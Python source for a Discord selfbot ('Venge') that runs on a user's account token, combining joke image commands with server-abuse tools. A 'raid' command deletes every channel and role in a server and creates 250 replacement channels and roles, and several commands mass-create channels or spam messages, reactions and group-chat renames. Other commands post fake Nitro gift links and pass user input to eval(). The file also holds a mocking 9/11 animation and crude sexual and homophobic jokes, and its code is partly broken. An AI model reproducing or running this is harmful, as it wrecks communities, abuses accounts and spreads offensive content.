import discord, time, requests, asyncio, json, random, datetime, colorama, re, os, ctypes,  numpy, webbrowser, base64, proxyscrape, pyfiglet, cursor, math, wikipedia, urllib, paramiko, socket
from urbandictionary_top import udtop
from tcp_latency import measure_latency
import ast
from urllib.request import urlopen
from os import system, name
from youtube_search import YoutubeSearch
import pyperclip
import sys
from pypresence import Presence
from time import sleep
from colorama import init, Fore, Style, Back
from itertools import cycle
from discord.ext import commands, tasks
from os import system, name
from itertools import cycle
from bs4 import BeautifulSoup as bs4
from faker import Faker
from pythonping import ping as pingip
from telnetlib import Telnet
from threading import Thread
import asyncio
import datetime
import functools
import io
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4
import pyfiglet
import aiohttp
import colorama
import discord
import numpy
import requests
from PIL import Image
from colorama import Fore
from discord.ext import commands
from discord.utils import get
from gtts import gTTS

import asyncio
import json
import time
import traceback
from os import system
from random import randint
from discord.ext import commands
import re
import httpx
from colorama import Fore, init
import platform
import discord
import asyncio
import subprocess
import requests
import json
import sys
import os
import psutil
import logging
import time
from colorama import Fore, Back, Style
from colorama import init as cinit
init()
data = {}


import os


import numpy
import json
import discord
from discord.ext import commands
import string
import random
import pyfiglet
import asyncio
import requests
from colorama import Fore, init
import time
from bs4 import BeautifulSoup as bs4
import aiohttp
from datetime import datetime
from itertools import cycle
import urllib
from urllib.parse import quote
from urllib.request import urlopen
from random import randint
import asyncio
import datetime
import functools
import io
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4

import aiohttp
import colorama
import discord
import numpy
import requests
from PIL import Image
from colorama import Fore
from discord.ext import commands
from discord.utils import get
from gtts import gTTS
import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging

from discord.ext import (
    commands,
    tasks
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
import pyPrivnote as pn
from gtts import gTTS



promote = "Venge"
col = "0000"
client = commands.Bot(description="venge selfbot", command_prefix=".",)
client = commands.Bot(".", self_bot = True)

@client.event
async def on_connect():
    print(f'''
                                  
 ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███████╗
██║   ██║██╔════╝████╗  ██║██╔════╝ ██╔════╝
██║   ██║█████╗  ██╔██╗ ██║██║  ███╗█████╗  
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██╔══╝  
 ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝███████╗
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
 Selfbot made by: $yn#0001
 [!]Bot is Ready
 [!]Prefix: .
 _____________________________________________
   
   ''')

    



@client.command()
async def spam(ctx, amount, *, text):
    await ctx.message.delete()
    try:
        amount = int(amount)
    except:
        await ctx.send('**The amount is invalid.**')
        return
    if amount <= 0:
        await ctx.send('**The amount has to be 1 or more.**')
        return
    for e in range(amount):
        await ctx.send(text)
        print("[!] Command used: spam")


val = 25

def _expose(mention):
    dick = random.randint(0, 25)
    height = random.randint(0, 120)
    hot = random.randint(0, 100)
    gay = random.randint(0, 100)
    ugly = random.randint(0, 100)
    horny = random.randint(0, 100)
    return f'{mention} is {gay}% gay :rainbow_flag:\n{mention} is {hot}% hot :hot_face:\n{mention} is {height} inches tall :night_with_stars:\n{mention} is {ugly}% ugly :face_vomiting:\n{mention}\'s dick is {dick} inches :triangular_ruler:\n{mention} is {horny}% horny :lips:'

pn = '0123456789'


client.remove_command('help')

@client.command(aliases=['markasread', 'ack'])
async def read(ctx): # b'\xfc'
    await ctx.message.delete()
    for guild in client.guilds:
        await guild.ack()
        print("[!] Command used: read")

@client.command()
async def smug(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)
    print("[!] Command used: smug")

@client.command()
async def pat(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)
    print("[!] Command used: pat")

@client.command()
async def kiss(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)
    print("[!] Command used: kiss")

@client.command()  
async def feed(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)
    print("[!] Command used: kiss")

@client.command()
async def tickle(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)
    print("[!] Command used: tickle")

@client.command()
async def slap(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)
    print("[!] Command used: slap")


        
@client.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f":globe_with_meridians: **{int(ping)} ms**")
    print("[!] Command used: ping")


@client.command()
async def spamreact(ctx, count=None, reaction=None):
    await ctx.message.delete()
    if count == None or reaction == None:
        embed=discord.Embed(description=f"**Format must be {prefixstr}spamreact [count] [emoji].**", color=col)
        embed.set_footer(text=promote)
        await ctx.send(embed=embed)
    else:
        async for message in ctx.message.channel.history(limit=int(count)):
            await message.add_reaction(reaction)
            print("[!] Command used: spamreact")

@client.command()
async def masschannel(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    count = 1
    while count < 50:
        name =  "raid"
        namea =  "raid"
        await guild.create_voice_channel(name)
        await guild.create_text_channel(namea)
        count = count + 1
        print("[!] Channel Created Succsefully")

@client.command(aliases=["shutdown", 'exit'])
async def logout(ctx):
    await ctx.message.delete()
    print(Fore.LIGHTBLUE_EX + '[/] ' + Fore.LIGHTGREEN_EX + f'Logged out: '+ Fore.LIGHTYELLOW_EX + f'Successfully logged out the self bot.' + Fore.RESET)
    await client.logout()



@client.command(aliases=["calc", "math"])
async def calculate(ctx, *, operation=None):
    await ctx.message.delete()
    try:
        operation = eval(operation)
    except ZeroDivisionError:
        await ctx.send(f"**Error: division by zero!**")
        return
    except:
        await ctx.send(f"**Error: expression could not be calculated!**")
        return
    await ctx.send(f"**The answer to your calculation is: **`{operation}`**!**")
    print("[!] Command used: calc")

@client.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(
            '[ERROR]: You\'re missing permission to execute this command',
            delete_after=3)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=3)
    elif isinstance(error, numpy.AxisError):
        await ctx.send('Invalid Image', delete_after=3)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.send(
            f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
    elif "Cannot send an empty message" in error_str:
        await ctx.send(
            '[ERROR]: Message contents cannot be null', delete_after=3)
    else:
        ctx.send(f'[ERROR]: {error_str}', delete_after=3)



@client.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in client.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers +
                   kickPermServers)
    print("[!] Command used: adminservers")


@client.command()
async def bots(ctx):
    await ctx.message.delete()
    bots = []
    for member in ctx.guild.members:
        if member.bot:
            bots.append(
                str(member.name).replace("`", "\`").replace("*", "\*").replace(
                    "_", "\_") + "#" + member.discriminator)
    bottiez = f"**Bots ({len(bots)}):**\n{', '.join(bots)}"
    await ctx.send(bottiez)
    print("[!] Command used: bots")

@client.command(aliases=["9/11", "911", "terrorist"])
async def nine_eleven(ctx):
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
{invis}:man_wearing_turban::airplane:    :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis} :man_wearing_turban::airplane:   :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}  :man_wearing_turban::airplane:  :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}   :man_wearing_turban::airplane: :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}    :man_wearing_turban::airplane::office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
        :boom::boom::boom:    
        ''')
    print("[!] Command used: 911")


@client.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    print("[!] Command used:cum")

@client.command()
async def clear(ctx):
    await ctx.message.delete()
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')
    print("[!] Command used: clear")

@client.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "Yes Its Syn LOL"
        name = ""
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)
            print("[!] Command used: spamgcname")


@client.command(
    aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {
            'name': 'IP',
            'value': geo['query']
        },
        {
            'name': 'Type',
            'value': geo['ipType']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'City',
            'value': geo['city']
        },
        {
            'name': 'Continent',
            'value': geo['continent']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'Hostname',
            'value': geo['ipName']
        },
        {
            'name': 'ISP',
            'value': geo['isp']
        },
        {
            'name': 'Latitute',
            'value': geo['lat']
        },
        {
            'name': 'Longitude',
            'value': geo['lon']
        },
        {
            'name': 'Org',
            'value': geo['org']
        },
        {
            'name': 'Region',
            'value': geo['region']
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)
    


@client.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send("missing parameters")
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(
                f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}"
        ) as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(
                        file=discord.File(file, f"venge_tweet.png"))
            except:
                await ctx.send(res['message'])
    print("[!] Command used: tweet")

@client.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_magik.png"))
        except:
            await ctx.send(res['message'])
    print("[!] Command used: distort")


@client.command(aliases=["deepfry"])
async def fry(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"exeter_fry.png"))
        except:
            await ctx.send(res['message'])
    print("[!] Command used: fry")


@client.command()
async def purge(ctx, count, user: discord.User=None):
    await ctx.message.delete()
    user = ctx.author if not user else user
    try:
        count = int(count)
    except:
        await ctx.send('The amount has to be a number')
        return
    if count <= 0:
        await ctx.send('The amount has to be 1 or more.')
        return
    e = 0
    async for message in ctx.message.channel.history():
        if message.author == user:
            if e == count:
                return
            e += 1
            try:
                await message.delete()
            except discord.Forbidden:
                return
        print("[!] Succesfully purged message")

@client.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx): 
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qb = soup.find(id='qb').text
    embed = discord.Embed(title = 'Would You Rather?', description = f'```🅰 = {qa}```\n\n**OR**\n\n```🅱 = {qb}```', colour = col)
    embed.set_footer(text=promote)
    message = await ctx.send(embed = embed)
    await message.add_reaction("🅰")
    await message.add_reaction("🅱")
    print("[!] Command used: wyr")

@client.command()
async def emojitext(ctx, *, txt):
    await ctx.message.delete()
    tosend = ''
    l = len(txt)
    for i in range(0, l):
        ch = txt[i].lower()
        if ch >= '0' and ch <= '9':
            if ch == '0':
                tosend += ':zero: '
            if ch == '1':
                tosend += ':one: '
            if ch == '2':
                tosend += ':two: '
            if ch == '3':
                tosend += ':three: '
            if ch == '4':
                tosend += ':four: '
            if ch == '5':
                tosend += ':five: '
            if ch == '6':
                tosend += ':six: '
            if ch == '7':
                tosend += ':seven: '
            if ch == '8':
                tosend += ':zero: '
            if ch == '9':
                tosend += ':zero: '  
        else:
            if ch >= 'a' and ch <= 'z':
                tosend += ':regional_indicator_' + ch + ': '
            elif ch == ' ':
                tosend += '     '

            else:
                tosend += txt[i]

    if len(tosend) > 2000:
        await ctx.send('Your text exceeded the 2000 character limit.')
    else:
        await ctx.send(tosend)  
    print("[!] Command used: emojitext")

@client.command()
async def terminal(ctx):
    await ctx.message.delete()
    os.system('clear')

@client.command()
async def playing(ctx, *, game=''):
    await ctx.message.delete()
    if game == '':
        embed = discord.Embed(description = f'**You have to specify the game name.**', colour = col)
        embed.set_footer(text=promote)
        return await ctx.send(embed = embed)
    await client.change_presence(activity=discord.Game(name=game))
    embed = discord.Embed(description = f'**Successfully set your status to `playing {game}`.**', colour = col)
    embed.set_footer(text=promote)
    await ctx.send(embed = embed)
    print("[!] Successfully changed status")

@client.command()
async def watching(ctx, *, watch=''):
    await ctx.message.delete()
    if watch == '':
        embed = discord.Embed(description = f'**You have to specify what you are watching.**', colour = col)
        embed.set_footer(text=promote)
        return await ctx.send(embed = embed)
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=watch))
    embed = discord.Embed(description = f'**Successfully set your status to `watching {watch}`.**', colour = col)
    embed.set_footer(text=promote)
    await ctx.send(embed = embed)

@client.command()
async def streaming(ctx, *, stream=''):
    await ctx.message.delete()
    if stream == '':
        embed = discord.Embed(description = f'**You have to specify what you are streaming.**', colour = col)
        embed.set_footer(text=promote)
        return await ctx.send(embed = embed)
    await client.change_presence(activity=discord.Streaming(name=stream, url='https://www.twitch.tv/twitch'))
    embed = discord.Embed(description = f'**Successfully set your status to `streaming {stream}`.**', colour = col)
    embed.set_footer(text=promote)
    await ctx.send(embed = embed)

@client.command()
async def listening(ctx, *, listen=''):
    await ctx.message.delete()
    if listen == '':
        embed = discord.Embed(description = f'**You have to specify what you are listening to.**', colour = col)
        embed.set_footer(text=promote)
        return await ctx.send(embed = embed)
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=listen))
    embed = discord.Embed(description = f'**Successfully set your status to `listening to {listen}`.**', colour = col)
    embed.set_footer(text=promote)
    await ctx.send(embed = embed)




@client.command()
async def nitro(ctx):
    await ctx.message.delete()
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    await ctx.send(f'https://discord.gift/{code}')
    print("[!] Command used: nitro")

@client.command(aliases=["fancy"])
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```' + r + '```') > 2000:
        await ctx.send('The text is too long. (Max 2000 characters)')
        return
    await ctx.send(f"```{r}```")
    print("[!] Command used: fancy")




@client.command(aliases = ['enlargeemoji'])
async def bigemoji(ctx, emoji: discord.Emoji = None):
    await ctx.message.delete()
    if emoji == None:
        await ctx.send("**You have to specify an emoji to enlarge.**")
        return
    await ctx.send(emoji.url)
    print("[!] Command used: enlargeemoji")


@client.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None): # b'\xfc'
    await ctx.message.delete()  
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)
    print("[!] Command used: firstmessage")

@client.command(name='8ball')
async def _ball(ctx, *, question): # b'\xfc'
    await ctx.message.delete()
    responses = [
      'That is a resounding no',
      'It is not looking likely',
      'Too hard to tell',
      'It is quite possible',
      'That is a definite yes!',
      'Maybe',
      'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    embed.set_footer(text=datetime.datetime.now())
    await ctx.send(embed=embed)
    print("[!] Command used: 8ball")

@client.command(aliases=['slots', 'bet'])
async def slot(ctx): # b'\xfc'
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} No match, you lost"}))
    print("[!] Command used: slot")


@client.command(aliases = ["gayrate"])
async def howgay(ctx, *, name=''):
    await ctx.message.delete()
    col = random.randint(0, 0xffffff)
    embed = discord.Embed(
        title = 'Gay Rate Machine',
        description = ':rainbow_flag: Calculating...',
        color = col
    )
    embed.set_footer(text = promote)
    sent = await ctx.send(embed = embed)

    await asyncio.sleep(2)
    
    number = random.randrange(0, 101)
    desc = ''
    if name == '':
        desc = f'You are {number}% gay :rainbow_flag:'   
    else:
        desc = f'{name} is {number}% gay :rainbow_flag:'       
    embed1 = discord.Embed(
        title = 'Gay Rate Machine',description = desc, color = col)
    embed1.set_footer(text = promote)
    await sent.edit(embed = embed1)
    print("[!] Command used: gayrate")

@client.command(aliases = ["simprate:"])
async def howsimp(ctx, *, name=''):
    await ctx.message.delete()
    col = random.randint(0, 0xffffff)
    embed = discord.Embed(
        title = 'Simp Rate Machine',
        description = ':pleading_face: Calculating...',
        color = col
    )
    embed.set_footer(text = promote)
    sent = await ctx.send(embed = embed)

    await asyncio.sleep(2)
    
    number = random.randrange(0, 101)
    desc = ''
    if name == '':
        desc = f'You are {number}% simp :pleading_face:'   
    else:
        desc = f'{name} is {number}% simp :pleading_face:'       
    embed1 = discord.Embed(
        title = 'Simp Rate Machine',description = desc, color = col)
    embed1.set_footer(text = promote)
    
    await sent.edit(embed = embed1)
    print("[!] Command used: simprate")

@client.command()
async def pp(ctx, *, name=''):

    await ctx.message.delete()
    col = random.randint(0, 0xffffff)
    embed = discord.Embed(
        title = 'Pp Machine',description = 'Calculating... :eggplant:',color = col)
    embed.set_footer(text = promote)
    sent = await ctx.send(embed = embed)

    await asyncio.sleep(2)
    
    number = random.randrange(0, 20)
    size = '=' * number
    desc = ''
    if name == '':
        desc = f"Your pp :eggplant:\n8{size}D"   
    else:
        desc = f" {name}'s pp :eggplant:\n8{size}D"          
    embed1 = discord.Embed(
        title = 'peepee machine', description = desc, color = col)
    embed1.set_footer(text = promote)
    
    await sent.edit(embed = embed1)
    print("[!] Command used: pp")

@client.command(aliases=['bitcoin'])
async def btc(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)
    print("[!] Command used: btc")

@client.command(aliases=['ethereum'])
async def eth(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    await ctx.send(embed=em)
    print("[!] Command used: eth")

@client.command(aliases=['namecolor', 'namecolour'])
async def rainbowrole(ctx, *, role: discord.Role):
    await ctx.message.delete()
    embed = discord.Embed(description = f'**Started changing the color for {role.mention}.**', color = col)
    embed.set_footer(text=promote)
    await ctx.send(embed = embed)
    count = True
    while count == True:
        try:
            await role.edit(role=role, colour=0xFF0000)
            await asyncio.sleep(0.1)
            await role.edit(role=role, colour=0xFF7F00)
            await asyncio.sleep(0.1)
            await role.edit(role=role, colour=0xFFFF00)
            await asyncio.sleep(0.1)
            await role.edit(role=role, colour=0x00FF00)
            await asyncio.sleep(0.1)
            await role.edit(role=role, colour=0x0000FF)
            await asyncio.sleep(0.1)
            await role.edit(role=role, colour=0x4B0082)
            await asyncio.sleep(0.1)
            await role.edit(role=role, colour=0x9400D3)
            await asyncio.sleep(0.1)
        except:
            count = False

@rainbowrole.error
async def rainbow_error(ctx, error):
    await ctx.message.delete()
    if isinstance(error, commands.RoleNotFound):
        await ctx.send("**Role not found.**")

@client.command()
async def hypesquad(ctx, house):
    await ctx.message.delete()
    with open('config.json', 'r') as f:
        d = json.load(f)
    request = requests.Session()
    headers = {
        'Authorization': d["token"],
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house.lower() == "bravery":
        payload = {'house_id': 1}
    elif house.lower() == "brilliance":
        payload = {'house_id': 2}
    elif house.lower() == "balance":
        payload = {'house_id': 3}
    elif house.lower() == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    else:
        await ctx.send("Invalid format.\nPlease use: {prefixstr}`hypesquad bravery / brilliance / balance / random`")
        return
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
        embed = discord.Embed(description = f"**Your hypesquad badge is {house}.**", color = col)
        await ctx.send(embed=embed)
    except Exception as e:
        print(f"{Fore.RED}[/] Error: {e}" + Fore.RESET)

@client.command()
async def raid(ctx):
    await ctx.message.delete()
    if str(ctx.channel.type) != 'text':
            await ctx.send('You can not use this command here.')
            return
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="Syn",
            reason="Syn",
            icon=None,
            banner=None
        )
    except:
        pass
    for i in range(250):
        try:
            await ctx.guild.create_text_channel(name="Syn Selfbot on top")
        except:
            pass
        await ctx.guild.create_role(name="Syn", color=col)


@client.command()
async def help(ctx):
    await ctx.message.delete()
    print(f'''

FUN COMMANDS:
some commands that @ user wont work in dms idk why sorry
------------- 
calculate - Calculates math
cum - Sends a Moving Cum Message
howgay - See how gay a user is
howsimp - See how much of a simp a user is
minesweeper - Plays a game of minesweeper
911 - Send whats happened on 911
pat - Pat a user
pp - Find a users PP size
slap - Slap a User
kiss - Kiss a user
slot - Play a game of slots
tickle - Tickle a user
tweet - Makes a fake tweet
8ball - Makes a 8ball
hug - Hug a user
feed - Feed a user
nitro - Creates Fake nitro
dog - Send Dog pics
cat - Send cat pics
clown - Clowns a user
trumptweet - Fake trump tweet
clyde - Fake clyde message
kill - Kill a user
phcomment - Fake ph comment
spank - Spanks a user
wizz - Fakes Wizz a server
cuddle - Cuddle a user
-----------------------

ACCOUNT COMMANDS:
-----------------
playing - Change Discord Status
watching - Change Discord Status
listening - Change Discord Status
stream - Fake Stream Discord Status
logout - Logout Selfbot
hypesquad - Change Hypesquad Badge
terminal - Clears Terminal
ping - Finds Bots Ping
adminservers - Shows Servers With admin
rainbowrole - Creats Rainbow role
bots - Show all bots in the server
invisnick - Makes nickname invisble
glitchnick - Nickname is a mess lol
stop - Stops Selfbot
-----------------------------------

TEXT COMMANDS:
--------------
spam - Spam a Message
purge - Purge Messages
clear - Sends Mass Blank Messages
ascii - Sends ASCII Message
